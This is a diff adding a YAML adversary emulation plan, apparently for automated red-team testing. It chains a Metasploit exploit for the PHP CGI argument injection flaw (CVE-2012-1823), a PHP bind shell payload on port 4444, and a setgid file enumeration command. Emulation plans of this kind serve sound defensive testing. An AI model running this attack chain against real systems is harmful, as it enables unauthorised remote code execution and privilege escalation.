@@ -1,0 +1,104 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-03 08:37:36 UTC+0000
+attack_action_sequence:
+  - uuid: 406c13e9-da5b-43a4-89af-c9b0efdc3ec2
+    name: PHP CGI Argument Injection
+    id:
+      - T1203
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - PHP
+    tactics:
+      - Execution
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation of Remote Services
+    description: |-
+      When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability.  This module takes advantage of the -d flag to set php.ini directives to achieve code execution. 
+       From the advisory: "if there is NO unescaped '=' in the query string, the string is split on '+' (encoded space) characters, urldecoded, passed to a function that escapes shell metacharacters (the "encoded in a system-defined manner" from the RFC) and then passes them to the CGI binary." This module can also be used to exploit the plesk 0day disclosed by kingcope and exploited in the wild on June 2013.
+    testbed:
+      CVE:
+        - CVE-2012-1823
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("multi/http/php_cgi_arg_injection")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 80
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      DOMAIN:
+        CurrentSetting: WORKSTATION
+        Required: true
+        Description: The domain to use for Windows authentication
+      URIENCODING:
+        CurrentSetting: 0
+        Required: true
+        Description: Level of URI URIENCODING and padding (0 for minimum)
+      PLESK:
+        CurrentSetting: false
+        Required: true
+        Description: Exploit Plesk
+  - uuid: ab9fd122-359a-4c23-a335-7a58b98ae97c
+    name: PHP Command Shell, Bind TCP (via php) IPv6
+    id:
+      - T1059.005
+      - T1071.001
+    source: Metasploit Payload
+    supported_platforms:
+      - PHP
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - 'Command and Scripting Interpreter: PHP (T1059.005)'
+      - 'Application Layer Protocol: Web Protocols (T1071.001)'
+    description: Listen for a connection and spawn a command shell via php (IPv6)
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("php/bind_php_ipv6")
+    arguments:
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+      RHOST:
+        CurrentSetting: ''
+        Required: false
+        Description: The target address
+  - uuid: 3fb46e17-f337-4c14-9f9a-a471946533e2
+    name: Do reconnaissance for files that have the setgid bit set
+    id:
+      - T1548.001
+    source: ART
+    supported_platforms:
+      - linux
+    tactics:
+      - Defense Evasion
+      - Privilege Escalation
+    technique:
+      - 'Abuse Elevation Control Mechanism: Setuid and Setgid'
+    description: |
+      This test simulates a command that can be run to enumerate files that have the setgid bit set
+    execution:
+      executor: Shell Executor
+      command: |
+        find /usr/bin -perm -2000
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2012-1823
